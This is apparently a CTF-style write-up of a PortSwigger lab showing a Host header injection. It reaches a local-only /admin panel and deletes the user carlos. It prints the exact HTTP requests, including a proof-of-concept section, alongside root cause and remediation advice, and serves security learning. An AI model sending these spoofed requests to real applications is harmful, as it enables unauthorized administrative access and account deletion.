@@ -1,0 +1,296 @@
+# Host Header Injection — Accessing an Internal Admin Panel
+
+## 1. Executive Summary
+
+The application exposed an administrative panel at `/admin` that was intended to be accessible only to local users.
+
+However, the authorization mechanism trusted the client-controlled `Host` header to determine whether a request originated from the local host. Because the application accepted arbitrary values in the `Host` header, it was possible to change the header to `localhost` and bypass the access restriction.
+
+This allowed unauthorized access to the administrative panel and, ultimately, deletion of the `carlos` user.
+
+**Vulnerability:** Host Header Injection / Improper Access Control
+**Severity:** High
+**Impact:** Unauthorized administrative access and user deletion
+**Affected endpoint:** `/admin`
+**Attack vector:** Manipulation of the HTTP `Host` header
+
+---
+
+## 2. Vulnerability Description
+
+The application attempted to restrict access to the administration panel to requests originating from the local machine.
+
+When accessing:
+
+```http
+GET /admin HTTP/2
+Host: 0aXXXXXXXXXXXX.web-security-academy.net
+```
+
+the application denied access and indicated that the administration panel could only be accessed by local users.
+
+This suggested that the application was performing an authorization check based on the requested host.
+
+Because the `Host` header is controlled by the client, it was possible to manipulate it:
+
+```http
+Host: localhost
+```
+
+The application then interpreted the request as originating from the local host and granted access to the administrative interface.
+
+---
+
+## 3. Technical Analysis
+
+### 3.1 Discovery of the Admin Panel
+
+The application's `robots.txt` file revealed the existence of the administration panel:
+
+```http
+GET /robots.txt HTTP/2
+Host: 0aXXXXXXXXXXXX.web-security-academy.net
+```
+
+The response disclosed:
+
+```text
+/admin
+```
+
+The `/admin` endpoint was therefore investigated.
+
+### 3.2 Initial Access Attempt
+
+A normal request to the administration panel was sent:
+
+```http
+GET /admin HTTP/2
+Host: 0aXXXXXXXXXXXX.web-security-academy.net
+```
+
+The application denied access.
+
+The error message indicated that the panel could only be accessed by local users.
+
+This was an important observation because it suggested that the application was making an authorization decision based on whether the request was considered local.
+
+### 3.3 Host Header Manipulation
+
+The request was sent to Burp Suite Repeater and the `Host` header was modified:
+
+```http
+GET /admin HTTP/2
+Host: localhost
+```
+
+The application accepted the modified request and returned the administrative interface.
+
+This demonstrated that the application was trusting the attacker-controlled `Host` header when determining whether the requester was local.
+
+---
+
+## 4. Exploitation
+
+Once access to `/admin` was obtained, the administrative interface exposed functionality for deleting users.
+
+The request was modified to target the `carlos` account:
+
+```http
+GET /admin/delete?username=carlos HTTP/2
+Host: localhost
+```
+
+The request was submitted through Burp Repeater.
+
+The application processed the request and deleted the `carlos` user, causing the PortSwigger lab to be marked as solved.
+
+---
+
+## 5. HTTP Request Flow
+
+The exploitation chain can be summarized as follows:
+
+```text
+/robots.txt
+     │
+     ▼
+Discover /admin
+     │
+     ▼
+GET /admin
+Host: lab-domain
+     │
+     ▼
+Access denied
+"Admin panel can only be accessed locally"
+     │
+     ▼
+Change Host header
+Host: localhost
+     │
+     ▼
+GET /admin
+     │
+     ▼
+Administrative panel accessible
+     │
+     ▼
+/admin/delete?username=carlos
+     │
+     ▼
+Carlos deleted
+```
+
+---
+
+## 6. Root Cause
+
+The root cause was an incorrect trust relationship between the application and the HTTP `Host` header.
+
+The application effectively implemented an authorization check equivalent to:
+
+```text
+if Host == "localhost":
+    allow access to /admin
+else:
+    deny access
+```
+
+This is insecure because the `Host` header is supplied by the HTTP client and can therefore be modified by an attacker.
+
+A client must never be considered a trusted source of information for security-sensitive authorization decisions merely because it supplies a particular HTTP header.
+
+---
+
+## 7. Security Impact
+
+An attacker able to reach the affected application could potentially:
+
+* Bypass the intended restriction on the administration panel.
+* Access administrative functionality without legitimate privileges.
+* Delete user accounts.
+* Potentially perform other administrative operations exposed through the panel.
+* Escalate the impact depending on the functionality available to administrators.
+
+The vulnerability therefore represents an **authorization bypass** with potentially significant consequences.
+
+---
+
+## 8. Remediation
+
+### 8.1 Do Not Use `Host` for Authorization
+
+The application should not determine whether a request is authorized to access `/admin` based solely on the `Host` header.
+
+The `Host` header should be treated as untrusted input.
+
+### 8.2 Implement Server-Side Authorization
+
+Administrative functionality should require an authenticated and authorized administrative identity.
+
+For example:
+
+```text
+Authenticated user
+        │
+        ▼
+Is user authenticated?
+        │
+       Yes
+        │
+        ▼
+Does user have administrator privileges?
+        │
+       Yes
+        │
+        ▼
+Allow /admin
+```
+
+Authorization should be based on server-side session or identity information rather than request headers.
+
+### 8.3 Validate Allowed Hostnames
+
+The application should also maintain a strict allowlist of legitimate hostnames and reject unexpected `Host` values.
+
+For example:
+
+```text
+Allowed:
+application.example.com
+
+Rejected:
+localhost
+127.0.0.1
+internal.example.com
+attacker-controlled.example
+```
+
+This is useful as a defense-in-depth measure, but **Host validation alone should not replace proper authorization**.
+
+### 8.4 Protect Administrative Actions
+
+Sensitive actions such as user deletion should additionally:
+
+* Require administrator privileges.
+* Use appropriate authentication.
+* Prefer `POST`/`DELETE` for state-changing operations rather than `GET`.
+* Implement CSRF protection where applicable.
+* Log administrative actions.
+
+---
+
+## 9. Risk Classification
+
+| Category                | Classification                        |
+| ----------------------- | ------------------------------------- |
+| Vulnerability           | Host Header Injection                 |
+| CWE                     | CWE-20 / CWE-284                      |
+| OWASP                   | Broken Access Control                 |
+| Severity                | High                                  |
+| Authentication Required | No administrative privileges required |
+| User Interaction        | None                                  |
+| Impact                  | Unauthorized administrative access    |
+
+---
+
+## 10. Proof of Concept
+
+The vulnerability can be reproduced with the following request:
+
+```http
+GET /admin HTTP/2
+Host: localhost
+```
+
+After obtaining access to the administration panel:
+
+```http
+GET /admin/delete?username=carlos HTTP/2
+Host: localhost
+```
+
+The second request successfully deletes the target account.
+
+---
+
+## 11. Conclusion
+
+The application relied on the client-controlled `Host` header to determine whether a request originated from a trusted local environment.
+
+By changing:
+
+```http
+Host: <lab-domain>
+```
+
+to:
+
+```http
+Host: localhost
+```
+
+the access-control mechanism was bypassed and the administrative panel became accessible.
+
+The vulnerability demonstrates why HTTP headers supplied by clients must not be trusted for authorization decisions. Proper server-side authentication and authorization controls should be implemented independently of the `Host` header.
